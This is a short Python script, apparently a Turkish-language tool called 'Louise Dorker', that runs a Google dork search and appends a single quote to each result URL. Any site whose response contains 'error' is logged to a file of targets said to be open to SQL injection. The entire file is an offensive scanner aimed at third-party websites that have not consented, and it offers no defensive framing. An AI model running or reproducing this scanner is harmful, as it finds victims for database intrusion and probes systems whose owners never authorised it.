print("Modüller Yükleniyor..")
import requests
import os
import pyfiglet
import time
from googlesearch import search

os.system("clear")
text = "Louise Dorker V1.0"
ascii_art = pyfiglet.figlet_format(text)
print(ascii_art)
query = input("Aramak istediğiniz dorku girin: ")
limit = int(input("Kaç Sql İnjection Açıklı URL kaydedilecek: "))

urls = []
for i, url in enumerate(search(query, num_results=limit), 1):
    try:
        response = requests.get(url + "'", verify=False)
        if 'error' in response.text.lower():
            urls.append(f"** Louise D0RK€R ! {i} ! ** = {url}")
            continue
        response.raise_for_status()
        urls.append(f"** Louise D0RK€R ! {i} ! ** = {url} -> Siteye erişim başarılı")
    except requests.exceptions.RequestException:
        pass

filename = query + f" ({limit}).txt"

with open('./dorks-finded/' + filename, 'w') as file:
    for url in urls:
        file.write(url + '\n\n')

print(f"{len(urls)} URL kaydedildi.")
